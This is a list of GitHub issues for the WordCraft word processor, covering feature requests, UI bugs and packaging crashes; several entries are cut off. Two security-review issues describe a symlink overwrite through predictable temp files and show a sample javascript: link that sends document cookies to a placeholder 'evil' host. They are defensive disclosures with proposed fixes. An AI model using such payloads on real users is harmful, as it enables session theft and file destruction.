title: fix(zotero): a pending citation inserts into the replacement document
author: coygeek
body:
## Summary

An Add/Edit Citation operation can insert its result into a blank document created after Zotero acquired the previous document. WordCraft accepts the original operation's delayed calls against the replacement document. This misplaces the citation and adds an undo step to the wrong document. The native app path is confirmed by source proof; runtime reproduction was not run.

## Steps to reproduce

These steps describe an unexecuted deterministic protocol replay for the source baseline below. Use an owned native WordCraft test instance with a fresh Zotero bridge and a clean blank Document A. Use a local Zotero protocol stub, with no real documents or settings. Pause the stub only long enough to replace the document, within its configured idle timeout.

1. Start `ui.zotero.addEditCitation` through the app's connected control channel or MCP. Let the stub read the integration command and send `Application_getActiveDocument` with arguments `[3]`. Wait for the reply. A fresh bridge returns protocol version 3 and document handle 1. Send no mutating call yet.
2. Hold the stub before its insertion calls. Run `file.new` with `{"template":"blank"}` in the app, creating Document B. Document A is still clean, so the ordinary user command does not require a Save Changes response. Confirm B is blank.
3. Release the stub. Send `Document_insertField` with `[1,"ReferenceMark",0]` and wait for the reply. In this fresh empty case the new field handle is 1. Send `Field_setCode` with `[1,1,"ITEM CSL_CITATION {}"]`, then `Field_setText` with `[1,1,"(Sample, 2020)",false]`, then `Document_complete` with `[1]`, waiting for each reply. Encode each call as UTF-8 JSON `[method, arguments]`, preceded by a 32-bit big-endian nonzero transaction ID and a 32-bit big-endian payload length, as the protocol requires.

title: Add an interface scale / UI font size setting
author: musaad-sharikh
body:
WordCraft draws its interface text at fixed sizes and offers no way to enlarge it. On a 24" 1080p monitor the ribbon and menus are smaller than the rest of the desktop. This looks like the same symptom as #68 ("everything looks too small" on a 1080p display); this issue asks for the setting that would let users correct it.

### Current behaviour

- Interface text sizes are constants in `crates/ui-egui/src/theme.rs` at v0.4.0: Body/Button 12.5, Small 10.5. These values are taken from the source; I have not measured them from a screenshot. The desktop UI font on the same screen is 11 pt (about 14.7 px).
- egui's keyboard interface zoom is turned off (`zoom_with_keyboard = false` in `crates/ui-egui/src/lib.rs`) and there is no preference to replace it, so the interface cannot be enlarged at all. Page zoom only affects the document.
- The window follows the Wayland output scale, so this is not a HiDPI detection problem.

### Requested

A preference that scales the whole interface and its fonts, independent of page zoom and remembered across restarts. For example "Interface size" with Auto plus percentage presets.

PdfCraft has this on main (storytold/pdfcraft#902, "Interface size") and PhotoCraft ships UI Scaling and UI Font Size in Preferences. The same control in WordCraft would keep the suite consistent.

### Environment

- WordCraft 0.4.0, Flatpak
- Linux, Wayland (niri), 1920×1080 24" monitor, output scale 125%

body:
File › Options is one short page today (theme, language, dark page, two display toggles, agents). Word's Options window has panes with many settings people look for.

Plan: a left pane list with
- **General**: user name and initials (used for comments/track changes), theme, interface language, interface size (#475/#480), mini toolbar on selection, live preview.
- **Display**: show formatting marks individually (tabs, spaces, paragraph marks, hidden text, optional hyphens, object anchors), print background colours/images, update fields before printing.
- **Proofing**: AutoCorrect Options… (#412/#476), check spelling as you type, mark grammar errors as you type, ignore words in UPPERCASE / with numbers / internet addresses, custom dictionary list (add/remove words).
- **Save**: AutoSave default (respecting #151/#184 behaviour), AutoRecover interval and location (display only where not configurable), default save format, default local folder.
- **Language**: editing/proofing language preference.
- **Accessibility**: keep accessibility checker running, feedback options that we have.
- **Advanced**: editing options (typing replaces selection, drag-and-drop, smart cut and paste, use Insert key for overtype), cut/copy/paste defaults (paste within/between documents, from other programs), show document content (picture placeholders, text boundaries, crop marks, bookmarks), display (recent documents count, measurement units, show pixels for HTML), print options, compatibility options shown for the document.

Each setting is wired to what WordCraft actually does (prefs in ui.json or document settings), and settings we don't implement yet are not shown. Engine/agent side: `file.options` returns/sets the same values headlessly.

title: Paragraph dialog: switching tabs re-centres the window, so the tab strip jumps up and down
author: python2121
body:
## Summary

The Paragraph dialog has three tabs (**Indents and Spacing**, **Line and Page Breaks**, **Asian Typography**), and each tab has a different amount of content, so the dialog's height changes when you switch tabs. That's expected. The problem is that the dialog stays vertically centred, so the extra height is split evenly above and below. The tab strip at the top moves up or down on every switch, and the tab you want to click next is no longer under the mouse.

## Steps to reproduce

1. Launch WordCraft and open any document (e.g. `--sample`).
2. Right-click in a paragraph and choose **Paragraph…**.
3. Note where the tab strip (Indents and Spacing / Line and Page Breaks / Asian Typography) sits on screen.
4. Click **Line and Page Breaks**, then **Asian Typography**, then **Indents and Spacing** again, without moving the mouse more than you need to.

## Current behavior

- On every tab switch the window grows or shrinks equally at the top and bottom, keeping its centre fixed.
- The title bar and tab strip jump up or down by half the height difference.
- The tab you just clicked, and the ones beside it, end up somewhere else on screen, so cycling through the tabs means chasing the tab strip with the mouse.

## Expected behavior

The top edge of the dialog (title bar and tab strip) should stay where it is while you switch tabs. Any change in height should only move the **bottom** edge (and the OK / Cancel buttons) up or down. This matches how tabbed dialogs usually behave: the controls you're interacting with don't move.

A reasonable approach: place the dialog once when it opens (centred, as now), then keep the window's top-left fixed for as long as it stays open, so later size changes only affect the bottom.

## Notes

- Likely cause: `crates/ui-egui/src/dialogs.rs:938-947` shows every dialog with `.anchor(egui::Align2::CENTER_CENTER, vec2(0.0, -40.0))`. An anchored egui window gets re-centred every frame, so any change in content height is split between to…

`wordcraft-cli commands --json | head` aborts with a Rust panic: `failed printing to stdout: Broken pipe (os error 32)`, exit status 101 under `pipefail`. `commands --json` is about 96 KB, past a typical 64 KB pipe buffer. title: Feature request: AutoSave & version history to a storage target you own (local/NAS, Google Drive, OneDrive, S3/R2 via rclone), with paragraph-level co-editing as a later phase
author: fernandodilland
body:
## TL;DR
In Word, AutoSave, Version History and co-authoring only work for files stored on OneDrive/SharePoint. Please add an open equivalent: one central "Save target" setting so a document can autosave to storage the user owns (local/NAS folder, Google Drive, OneDrive, S3-compatible such as Cloudflare R2, or anything rclone supports), keep automatic version history, avoid overwrites with a lease file, and optionally grow into paragraph-level co-editing. Opt-in, no vendor server, no telemetry.

## Why
- Unsaved documents are the classic way writers lose work. I couldn't find AutoRecover/AutoSave in the README (I couldn't read the source, so please correct me).
- A .docx is small, so syncing whole files is cheap: a lot of safety for little engineering.
- People who self-host can't use OneDrive-based features.

## How Word does it
- AutoSave is on by default only for files in OneDrive, OneDrive for Business or SharePoint Online. The first edit creates a version, then a new one is added roughly every 10 minutes. Without it only local AutoRecover remains (10 minutes by default in the docs I found).
- Co-authoring is server-side: File > Save pushes your changes, pulls other authors' changes and updates version history. Microsoft's own Q&A says Word still uses paragraph-level locking in some scenarios. When edits collide, users fall back to Review > Compare > Combine.
- On a plain network share Office uses a hidden `~$` owner file as a soft lock, which goes stale after a crash.

## What WordCraft has today (README only)
.docx read/write, track changes with accept/reject, comments, **Compare documents**, undo/redo, 389 commands shared by UI/CLI/control channel/MCP, web build.

## Proposal
**Phase 0, AutoSave + crash recovery (local):** debounced autosave from an immutable snapshot; atomic writes (temp -> fsync -> rename) into a recovery journal; recovery prompt on next start; a `file.autoSave` command; default in the Save options.
**Phase 1, pluggable Save target:** see s…

## Summary

The official WordCraft macOS DMG contains an app that fails `codesign --verify --deep --strict`, both inside the mounted image and after copying it with `ditto`. Removing only `com.apple.FinderInfo` from the disposable copied app restores strict verification, and Gatekeeper then accepts it as `Notarized Developer ID`. This affects package verification; I did not test or establish a GUI launch failure.

Download the official artifact into a disposable directory and mount it read-only. These steps were executed on the measured host with a fresh download:

Find and Replace treats `^p`, `^t` etc. literally. Word's Find/Replace supports special codes and a wildcard mode.

Plan:
- Special codes in Find and Replace (Special ▾ menu in the dialog): paragraph mark ^p, tab ^t, any character ^?, any digit ^#, any letter ^$, caret ^^, manual line break ^l, manual page break ^m, section break ^b, column break ^n, em/en dash ^+ / ^=, nonbreaking space ^s, nonbreaking hyphen ^~, optional hyphen ^-, white space ^w, "Find what text" ^& (in Replace), clipboard contents ^c (Replace).
- "Use wildcards" mode: ?, *, [abc], [a-z], [!x], {n,m}, @, <, >, ( ) groups and \1 back-references in Replace.
- Match case / whole words / prefix / suffix / ignore punctuation / ignore white-space options where not yet there.
- Engine: `edit.find` / `edit.replace` params (`special`, `wildcards`, …) so agents get the same; Replace with ^p splits paragraphs.
- Tests per code family and wildcard grouping/back-references; hostile patterns bounded (no catastrophic backtracking).

Plan:

- Word 2003 XML: read text, paragraph/run formatting, styles, lists, tables, sections, pictures (`w:binData`), hyperlinks into our model (import only; saving as 2003 XML is out of scope).

title: Let an end user add a font without rebuilding
author: tonguyenducmanh
body:
## Ask

Let an end user add a font without rebuilding:

- **Paste a link** — Google Fonts `/css2?family=…`, any stylesheet with `@font-face`, or a direct
  `.ttf` / `.otf` / `.woff2` URL.
- **Upload a file** — drag-drop or picker.

Today the web build ships only the fonts in `crates/fonts`, and changing that means a rebuild.

## Current behaviour

- `crates/fonts` bundles OFL faces — the documented exception to the "fonts live in `craft-fonts`"
  rule, per ATTRIBUTION.md — and `crates/doc` / `crates/layout` shape text with them.
- The web build has no runtime font loading at all, so the bundle is all a browser user has.

## Scope caveat

A user-installed font only helps **if shaping supports its script**. `crates/doc` shapes with
`skrifa` / `harfrust` and ROADMAP.md still lists Arabic and Devanagari shaping as open — so this
feature and that item are related but separate. Flagging so it isn't read as a shortcut around it.

## Suggestion

`crates/fonts` already owns font selection for layout, so layer a runtime set on top of the
bundled one rather than replacing it:

- bundled OFL faces = always-available baseline
- user-installed faces = added at load, never replacing the baseline

Keeping the baseline intact matters for `docs/typing-parity.md` — a user who installs a font
shouldn't silently change the metrics of documents that don't reference it.

## Why this fits

Four entries in the `CommandSpec` registry, and the web UI, CLI, MCP surface and JSON control
channel all follow for free:

| id | params |
| --- | --- |
| `font.install_url` | `{ url }` — `journal: true` |
| `font.install_file` | `{ path }` (desktop) / `rfd` picker (web) |
| `font.remove` | `{ family }` |
| `font.list` | — |

Persist in IndexedDB (`localStorage`'s ~5 MB is smaller than one CJK face); on desktop, an app font
directory `crates/fonts` already scans. Per `standards/never-crash.md`: a failed install logs and
skips, never panics.

## Acceptance criteria

- Installed font appears in the existi…

title: [Windows] 0.5.0 exits at startup: DXC runtime (dxcompiler.dll + dxil.dll) not shipped -> "Parent device is lost"
author: engmgs
body:
**wordcraft 0.5.0 (portable x64 zip and MSI, 2026-10-07 release) exits ~0.1 s after the window appears (exit code 1)** on Windows 11 Pro 10.0.26100, NVIDIA GeForce RTX 4090 (driver 32.0.16.1088), DirectX 12 default backend.

Same root cause as storytold/craft-launcher#126 (opened the same day) and storytold/lightcraft#471 (fixed there by #484). Of the twelve Craft apps installed on this machine the same log appears in cadcraft 0.5.0, gridcraft 0.5.0, deckcraft 0.5.0, soundcraft 0.5.0, vectorcraft 0.9.0; photocraft, filmcraft, lightcraft, pdfcraft, effectcraft and designcraft tolerate it.

**Log** (`%APPDATA%\WordCraft\logs\wordcraft.log`, identical every start):
```
ERROR [main] wgpu_core::indirect_validation: indirect-validation error: ComputePipeline(Internal("DXC compile error: warning: DXIL signing library (dxil.dll,libdxil.so) not found.  Resulting DXIL will not be signed for use in release environments.\r\n\n"))
WARN  [main] gpu_allocator::allocator::free_list_allocator: leak detected: { ... (wgpu internal) zero init buffer ... }
ERROR [main] eframe::native::run: Exiting because of error: WGPU error: Parent device is lost
Error: Wgpu(RequestDeviceError(RequestDeviceError { inner: Core(Device(Lost)) }))
```

**Cause**: the build uses DXC for DX12 shader compilation (the wgpu `indirect_validation` compute pipeline) but ships neither `dxcompiler.dll` nor `dxil.dll`. The unsigned-DXIL warning is treated as a compile error, the pipeline fails, and the device is lost before the first frame.

**What I verified**
1. `WGPU_BACKEND=vulkan` -> starts (as the cadcraft README troubleshooting section says).
2. A **matched** `dxcompiler.dll` + `dxil.dll` pair next to `<app>.exe` -> starts on DX12 from a plain double-click, no env var. Pair used: the one shipped with Microsoft Edge 154.0.4258.62.
3. `dxil.dll` alone (Chrome 154's copy) is **not** enough: `DXC compile error: error: validation errors / DXIL container mismatch for 'PSVRuntimeInfoSize' between 'PSV0' part:('48') …

title: fix(table): a vertical merge (eraser on a horizontal border) still shows and clicks as two cells
author: rabis7575
body:
Found while testing table editing on current `main` (1d4f741).

**Steps**
1. Insert a 3×3 table and type something in the first two cells of the first column.
2. Table Layout › Draw › Eraser, click the horizontal border between the first two rows of the first column.

**What happens**
The border disappears and the text of the lower cell moves into the upper one, so the document does
merge them (`vmerge` restart/continue). But on screen it is still two cells:
- with Table Layout › View Gridlines on (the default) a gridline stays between the two rows;
- a click in the lower half puts the caret in an empty cell of its own (the continuation cell),
  so typing there goes into a cell that isn't shown as one.

Erasing a vertical border (a merge within one row) works as expected.

**Expected (Word)**
A vertically merged cell is one cell spanning the rows: no gridline inside it, and a click anywhere
in it puts the caret in it.

**Where it comes from**
`layout_table` (`crates/layout/src/table.rs`) pushes one `Placed::Cell` per row for every cell, the
continuation cells of a vertical merge included, each only as tall as its own row. The gridlines
(canvas, View Gridlines) outline every `Placed::Cell`, and hit testing (`crates/layout/src/hit.rs`)
picks the cell whose rect contains the point. The borders themselves are already right (the merged
group's inner top/bottom rules are skipped).

A possible fix: one `Placed::Cell` for the whole merge (the restart cell, as tall as its rows) and
none for the continuation cells, or map continuation cells to the restart cell in hit testing and
skip their inner gridline. Other users of the cell boxes (table border resizing and table mouse
handling, #600, #637) read row geometry from them, so they need a look too.

Happy to take this on if nobody else is on it.

title: File > Print: add Word's print settings (Current Page, custom page range, copies, printer, duplex, pages per sheet) and a print preview
author: maruf7705
body:
The File > Print page is only a single Print button and a list of "save a copy" formats (PDF, docx, odt, rtf, html, md, tex, txt, png). That list is really Export, not printing. There are no print settings on the page, so there is no way to decide what gets printed before it goes out.

In Word, File > Print (Ctrl+P) is where you set all of that up, with a live preview of the pages on the right. These are the settings I use most and can't find here.

Which pages to print. This is the biggest gap. Word's "Print All Pages" dropdown offers Print All Pages, Print Selection, Print Current Page and Custom Print. With Custom Print you type a range in the Pages box, like 1-3, 5, 8-10. There is also "Only Print Odd Pages" and "Only Print Even Pages", which people use for manual double-sided printing. Right now Print hands the document to another viewer, which has no idea which page my cursor is on or what I have selected. So "Current Page" and "Print Selection" can't work from there, and for a custom range I have to look up the page numbers by hand.

Copies and printer. A Copies box, a Printer dropdown that lists the installed printers with their status, and a Printer Properties link.

Sides and collating. One-sided, Print on Both Sides (flip on long edge or short edge), and Manually Print on Both Sides for printers without duplex. Collated (1,2,3 1,2,3) or Uncollated (1,1,1 2,2,2).

Page layout. Orientation (portrait or landscape), paper size (A4, Letter, Legal and so on), margins (Normal, Narrow, Moderate, Wide, Mirrored, Custom), and a Page Setup link.

Scaling. Pages per sheet (1, 2, 4, 6, 8, 16) and Scale to Paper Size.

What gets printed. Print Markup on or off for tracked changes and comments.

Preview. A page preview next to the settings with next/previous page and a zoom slider, so I can check the result before printing.

I'd expect the Print page to look like Word's: settings on the left, preview on the right, and the Print button applying them. The save-a-copy form…

title: Ribbon group titles collide with button labels
author: dkhlapov
body:
Two-line labels on large ribbon buttons end about 4 px below the button area, inside the group title row, so titles and labels overlap. Visible in about 20 groups across every tab, for example Table of Contents, Footnotes, Start Mail Merge, Write & Insert Fields, Preview Results, Finish, Speech, Accessibility, Protect, Ink, Views, Page Movement, Dark Mode and Window. Languages whose labels wrap more often are hit harder.

Cause: `big_button` / `menu_button` in `crates/ui-egui/src/widgets.rs` place the icon at 20 px and the first label line at 43 px with a 13 px pitch, so the second line ends past `CONTENT_H` (66 px), and the title is drawn 8 px from the bottom of a 16 px `LABEL_H` row. The Equation button in `equation_tab.rs` repeats the same numbers.

Fix: move the icon and label up, give the title row more room, share the offsets as constants, and assert at compile time that two label lines end inside `CONTENT_H`.

title: Layout tab: Paragraph fields overlap the group title and are misaligned
author: dkhlapov
body:
In Layout › Paragraph, the second row of fields (Indent Right, Spacing After) runs into the "Paragraph" group title. The label/field pairs are also uneven: the Left and Right boxes start at different x positions, and the Before and After boxes have different widths.

Fix: fit both rows inside the group's content height and align the fields on a shared column.

title: Dark theme: white on the accent colour fails contrast
author: dkhlapov
body:
In the dark theme the accent is #7a93f0, and several controls put white on it:

- Share button: 2.9:1, and 2.1:1 on hover (#9cb0f5)
- avatar initials in the title bar
- AutoSave toggle knob
- keytip badges (`on_accent` is white in both themes)

Text needs 4.5:1 and controls 3:1. Fix in `theme.rs`: a darker accent fill for filled controls in the dark theme, or dark text on the light accent, and have every filled control use `on_accent` instead of `Color32::WHITE`.

title: Interface colours hard-coded outside the theme
author: dkhlapov
body:
Some interface colours bypass `theme::Tokens`:

- Dialog primary buttons (OK, Save, Close in `dialogs.rs`, `dialogs_insert.rs`) fill with the light-theme `APP_COLOR` and white text in both themes.
- The title-bar Discord pill (`chrome.rs`) uses fixed brand blues (#5865F2 / #4752C4) and white.
- The table eraser line (`table_pen.rs`) hard-codes red instead of `Tokens::red`.
- The Navigation pane search highlight (`panes.rs`) hard-codes #FFF176 with black text and has no dark-theme variant.

Fix: route these through tokens (accent / on_accent, red, a find-highlight token per theme).

title: Input field borders are below 3:1 contrast
author: dkhlapov
body:
Text field and combo outlines (`input_border`) are #c7c7c7 on white (1.7:1) in the light theme and #585858 on #1e1e1e (2.3:1) in the dark theme. Control boundaries need 3:1 against their background.

Fix: darken `input_border` in light and lighten it in dark until both reach 3:1.

title: Disabled menu buttons never grey out
author: dkhlapov
body:
`menu_button` in `crates/ui-egui/src/widgets.rs` always draws its icon, label and dropdown marker in the enabled colours. It has no command id, so it can't ask whether it is enabled. There are 61 menu buttons in the ribbon (Header, Page Number, Breaks…). Split buttons and big/small buttons already grey out.

Fix: let menu buttons take an enabled flag or a command id to check, and draw the disabled state like the other buttons.

title: Two different dropdown markers in the ribbon
author: dkhlapov
body:
Large ribbon buttons, the Equation button and the Editing/Reviewing mode button append a "▾" text glyph to their label, while split and menu buttons draw the `dropdown` icon. The two markers differ in size, weight and position.

Fix: use the `dropdown` icon everywhere and drop the glyph.

title: Icons painted at off-grid sizes outside the ribbon
author: dkhlapov
body:
The icon rules in `icons.rs` call for 16 px or 32 px. A few call sites still use other sizes: 18 px (backstage back button), 22 px (backstage page tiles), 14 px (Share button), 10 px and 9 px (dropdown markers). At these sizes strokes land between pixels and look soft.

Fix: move each call site to 16 or 32 px and adjust the surrounding layout.

title: References › Table of Authorities: unlabelled button
author: dkhlapov
body:
In References › Table of Authorities, "Insert Table of Authorities" is an icon-only button floating in the group's top corner, while the matching "Insert Index" in the group next to it has a label. It reads as stray and has no glance value.

Fix: give it a label like Insert Index (and Update Table next to it, as in the Index group).

title: Home tab overflows at common window widths
author: dkhlapov
body: At a 1440 pt wide window the Home tab doesn't fit: the last groups are cut off mid-icon behind a scroll chevron. Collapsing groups to smaller layouts (label-less small buttons, then a single drop-down per group) as the window narrows would keep every command visible without scrolling.

title: Styles gallery tiles are bright white in the dark theme
author: dkhlapov
body: In the dark theme the Styles gallery previews are drawn on white tiles, which makes them the brightest area of the interface. They preview the page, so a light ground may be intended. If so, consider a dimmer page tone for the tiles, or the dark page colour when View › Switch Modes is on.

title: Brand licence text names DesignCraft instead of WordCraft
author: dkhlapov
body: `docs/brand/LICENSE-brand.txt` grants permission to use the ArtCraft marks "within DesignCraft" and refers to "DesignCraft's MIT OR Apache-2.0 license", but the file lives in the WordCraft repository. It looks copied from the sibling repo. The wording is legal text, so it needs the ArtCraft team to confirm the corrected version.

title: rustdoc: broken private link to REGION_LABELS in dialogs.rs
author: dkhlapov
body:
`cargo doc -p wordcraft-ui-egui --document-private-items` with `-D warnings` fails: the public field doc in `crates/ui-egui/src/dialogs.rs` ("Index into `regions` (see [`REGION_LABELS`])") links to the private `REGION_LABELS` constant (`rustdoc::private_intra_doc_links`).

Fix: write the name as plain code instead of a link, or make the constant `pub(crate)` and link it from a non-public doc.

title: Palatino Linotype / Book Antiqua fall back to Times New Roman on macOS instead of Palatino
author: anmacmillan
body:
A DOCX set in Palatino Linotype renders in Times New Roman on macOS when the font is not in the system font folders, and a 4-page document in Word for Mac becomes 3 pages.

`substitutes()` in `crates/fonts/src/word.rs` maps `"palatino linotype"` and `"book antiqua"` to the generic `SERIF` list (Caladea, Times New Roman, …). macOS ships `Palatino` in `/System/Library/Fonts/Palatino.ttc`, the same design with much closer metrics.

Suggestions:

1. Give these two families their own list that tries `Palatino`, `TeX Gyre Pagella` and `URW Palladio L` before `SERIF`.
2. On macOS, also scan `/Applications/Microsoft Word.app/Contents/Resources/DFonts`, where Office installs Palatino Linotype, Aptos and others. `fontdb.rs` scans only `/System/Library/Fonts` and `/Library/Fonts`.

Repro: any DOCX with body text in Palatino Linotype, `wordcraft-cli convert in.docx out.pdf`, WordCraft 0.5.0 at `9cf3b68`, macOS on Apple silicon. Fonts embedded in the PDF: TimesNewRomanPSMT.

title: Control channel and MCP bridge write PNGs to predictable names in the shared temp folder
author: petycomp
body:
Found in a security review of `main` (dba6e66).

**Where**
- `crates/ui-egui/src/control.rs:206` — `ui.render` without `path` writes to the literal `/tmp/wordcraft-page.png` (also on macOS, not `$TMPDIR`).
- `crates/ui-egui/src/control.rs:238` — `ui.screenshot` without `path` writes to `/tmp/wordcraft-screenshot.png`.
- `crates/mcp/src/tools.rs:249` and `:269` — the `--connect` bridge's `render_page` and `screenshot` tools always round-trip through `temp_dir()/wordcraft-mcp-page.png` / `wordcraft-mcp-shot.png`, then read the file back for the model.

All of these end in `std::fs::write`, which follows an existing symlink and truncates its target.

**Scenario**
On a multi-user Linux/macOS host another local user pre-creates `/tmp/wordcraft-page.png -> /home/victim/Documents/thesis.docx`. The victim runs `wordcraft --control 7981` and an agent calls `ui.render` without `path`, or `render_page` through the MCP bridge: the victim's file is overwritten with PNG bytes. In the bridge case an attacker who races the write/read can also substitute the image the model sees.

Preconditions keep this moderate: `--control` is opt-in, the request has to come through the authenticated control channel or the MCP bridge, and the host must be shared. `apps/wordcraft/src/print.rs:52-77` already shows the safe pattern (`create_new(true)` + mode 0600 + a per-process unique name).

**Suggested fix**
Return the PNG in the reply (base64 `png`, the shape the headless MCP `ui.render` already uses) when no `path` is given, and have the bridge use that instead of a temp file. PR to follow.

title: HTML and Markdown export write javascript: and other non-web hyperlink targets into href
author: petycomp
body:
Found in a security review of `main` (dba6e66).

**Where**
`crates/formats/src/html.rs:1208` writes any `CharProps.link` into `<a href="…">` after escaping only `& < > "`; `crates/formats/src/markdown.rs:1132,1168` likewise write it as the link destination. There is no scheme check. By contrast the HTML importer drops `javascript:` hrefs (`html.rs:1008`) and Ctrl/⌘-click only follows `http`/`https`/`mailto` (`crates/ui-egui/src/canvas.rs:1688`), so export is the one place the project's own link policy is missing.

**Scenario**
A received .docx/.odt/.rtf carries a hyperlink `javascript:fetch('https://evil/?c='+document.cookie)` (`w:hyperlink` with an External relationship; ODT `xlink:href`; RTF `HYPERLINK` field — all read verbatim). Opening it in WordCraft is safe (the click is refused). If the user then does Save As → HTML and opens or publishes that file, clicking the link runs the attacker's script in the file's or hosting site's origin. Note that browsers strip tabs/newlines before parsing, so `java\nscript:` counts too.

Severity: low (needs a second user action), but it is a one-line policy gap.

**Suggested fix**
One shared allow-list (web, mail, `#bookmark`, relative path) used by the HTML/Markdown exporters, the HTML importer and the click handler. PR to follow.

title: Insert a chart backed by an embedded .xlsx workbook (like Word's Insert > Chart)
author: xmaxcooking
body:
Word's Insert > Chart embeds the source data as a real spreadsheet package (`externalData` relationship → `embeddings/Microsoft_Excel_Worksheet.xlsx`) and bakes `c:numCache`/`c:strCache` from it. WordCraft has no path to that.

- #409 plans `insert.chart` with its own data-grid editor, but the plan skips the embedded workbook outright (`c:externalData` omitted — "Word's Edit Data will then offer to create one").
- #319 preserves charts/SmartArt/OLE objects, embedded workbooks included, when round-tripping a file that already has them — but only for objects WordCraft didn't create itself.

A Word-made chart-from-Excel round-trips fine. WordCraft can't produce one.

Narrow first step: a command that takes a user's .xlsx (or a picked range), bakes the cache from it once, and copies the source .xlsx in unchanged as the `externalData` part. No xlsx writer needed — `embed.rs` already carries an embedded part through on save. Editing or re-baking the data afterward is a separate problem.

title: Bug: Editor loses cursor focus after changing paragraph alignment
author: Osaym
body:
**Description:**
Changing the paragraph alignment (left, center, or right) causes the text editor to lose focus. The cursor completely disappears, forcing the user to manually click back into the document to continue typing.

**Steps to Reproduce:**
1. Open the editor and place the cursor in any paragraph.
2. Click any paragraph alignment button (Left, Center, or Right).
3. Attempt to continue typing.

**Expected Behavior:**
The text alignment changes, but the cursor remains active in the document so typing can continue seamlessly.

**Actual Behavior:**
The cursor vanishes and the editor loses focus entirely. A manual mouse click back inside the document is required to resume typing.

title: Paste: Ctrl+V pastes formatted text as plain text; Merge Formatting does nothing; Paste Special says "The clipboard is empty."
author: netoverlord
body:
## Summary

Pasting formatted text into WordCraft loses all formatting. Ctrl+V inserts plain text, **Home › Paste › Merge Formatting** does nothing, and **Home › Paste › Paste Special…** says "The clipboard is empty." even though the clipboard has content.

## Steps to reproduce

1. In another app, copy text that has formatting (bold, italic, colors, different fonts, headings, etc.). For example, copy a formatted paragraph from Microsoft Word or from a web page.
2. In WordCraft, place the cursor in a document.
3. Press **Ctrl+V**.
4. Undo, then try **Home › Paste › Merge Formatting**.
5. Try **Home › Paste › Paste Special…**.

## Current behavior

- **Ctrl+V** pastes the text as plain, unformatted text.
- **Merge Formatting** does nothing (no text is inserted).
- **Paste Special…** shows "The clipboard is empty." even though the clipboard contains the copied text.

## Expected behavior (as in Microsoft Word)

- When formatted text is copied, it goes onto the clipboard with its formatting.
- **Ctrl+V** and **Home › Paste** paste it with its formatting by default.
- A **Paste Options** control appears after pasting, with choices such as Keep Source Formatting, Merge Formatting and **Keep Text Only** (paste without formatting).
- **Home › Paste** has the same options in its dropdown.

## Environment

- WordCraft version: 0.5.0
- OS: Windows 11

## Steps to reproduce

2. Turn on the ruler (**View › Ruler**).
3. Click in a paragraph (or select some text).
4. Click **Home › Paragraph › Right-to-Left Text Direction**.

title: Rulers: table column and row markers (drag to resize), indents measured from the cell
author: rabis7575
body:
With the caret in a table, Word's horizontal ruler marks the column borders of the caret's row and the vertical ruler the row borders; dragging a marker resizes that column or row, and the indent markers are measured from the cell. WordCraft's ruler shows none of this, and in a cell it places the indent markers as if the paragraph started at the page margin (the "table column markers on the ruler" gap in docs/gaps.md; ui-parity "Rulers").

I'm working on this (it builds on the border dragging from #600); a PR will follow.

title: Feature request: Undo history dropdown (undo several steps at once, like Word)
author: netoverlord
body:
## Summary

Add a dropdown arrow next to the **Undo** button that opens a list of recent actions. Selecting an entry undoes everything back to that point in one step, as in Microsoft Word.

## Current behavior

Undo can only step back one action at a time (button or Ctrl+Z). To go back several steps, you have to press it repeatedly and check the document after each press to see where you are.

## Expected behavior (as in Microsoft Word)

- A small dropdown arrow sits next to the **Undo** button (in the Quick Access Toolbar).
- Clicking it opens a list of recent actions, most recent first (e.g. "Typing", "Bold", "Paste", "Delete").
- Moving the mouse over an entry highlights it and everything above it, to show what will be undone.
- A label at the bottom shows how many actions will be undone (e.g. "Undo 3 Actions").
- Clicking an entry undoes all actions up to and including that one.

## Suggested implementation notes

- Each undo entry needs a short, readable name (e.g. "Typing", "Apply Bold", "Paste"). Consecutive typing could be grouped, as Word does.
- Optional: show a limit on the list length (Word shows a long, scrollable list).

title: Backspace not working while shift modifier is held.
author: kawaicutout

Backspace does not erase characters while shift is held.

Tested on Linux x86-64 AppImage.

title: Tables: finish resizing with the mouse — Ctrl, Alt, the table's left edge, selected cells only
author: rabis7575
body:
#600 resizes a table by dragging a column border, a row's bottom border or the corner handle. Word's border drags do more, and WordCraft doesn't have these yet:

- **Ctrl** while dragging a column border: the columns to its right share the change in proportion, so the table keeps its width.
- **Alt** while dragging: the ruler shows the column widths.
- **The table's left edge** can be dragged: it moves the table's indent and changes the first column's width, and the horizontal ruler gets a marker for it (#710).
- **With cells selected**, dragging one of their borders moves it only in the selected cells' rows (the other rows keep theirs).

I'm working on this (it builds on #600, #710 and the cell selection from #637); a PR will follow.

title: Find: Ctrl+F opens both Navigation pane and Find window; Find / Advanced Find / Go To don't match Word's behavior
author: netoverlord
body:
## Summary

The Find commands in WordCraft don't behave like Microsoft Word's. **Ctrl+F** opens two things at once (the Navigation pane and a Find window), **Advanced Find…** opens the same window as plain Find, and **Go To…** opens a small separate window.

## Current behavior

- **Ctrl+F** opens both the **Navigation** pane on the left and a **Find** window in the center.
- **Home › Editing › Find** opens a dropdown with three items:
  - **Find** opens the Find window.
  - **Advanced Find…** opens the same Find window.
  - **Go To…** opens a separate small Go To window where you type a page number.

## Expected behavior (as in Microsoft Word)

- **Ctrl+F** opens only the **Navigation** pane on the left.
- **Home › Editing › Find** (the button itself) also opens only the Navigation pane.
- **Home › Editing › Find › Advanced Find…** opens the **Find and Replace** dialog on the **Find** tab.
- **Home › Editing › Find › Go To…** opens the **Find and Replace** dialog on the **Go To** tab.
- **Home › Editing › Replace** opens the **Find and Replace** dialog on the **Replace** tab.
- The **Find and Replace** dialog has three tabs (**Find**, **Replace**, **Go To**), and the user can switch between them without closing the dialog.

## Suggested changes

1. Make Ctrl+F and the Find button open only the Navigation pane.
2. Make Advanced Find… open the Find and Replace dialog on the Find tab.
3. Replace the separate Go To window with the Go To tab of the Find and Replace dialog, and open it from Go To…
4. Make the Replace button open the same dialog on the Replace tab.
5. Add the three tabs (Find, Replace, Go To) to one shared dialog, so all three commands use the same window.

## Why this matters

- It matches the behavior users already know from Word.
- Ctrl+F is used constantly, and having two panels open at once is distracting and covers the document.
- One shared Find and Replace dialog is more consistent than separate windows for each function.

## Screenshot from MS Wo…

author: Skaywalker
body:
## Problem

Everything below the interface catalogs is wired to US English, whatever language the text is in:

- **Smart quotes** always produce “…” and ‘…’ (`crates/engine/src/cmd/text.rs`). German, Hungarian,
  Polish and Czech use „…”; French uses « … » with spaces; Hungarian nests »…« inside „…”.
- **AutoCorrect sentence capitals** use an English abbreviation list (`cmd/tools.rs`), so
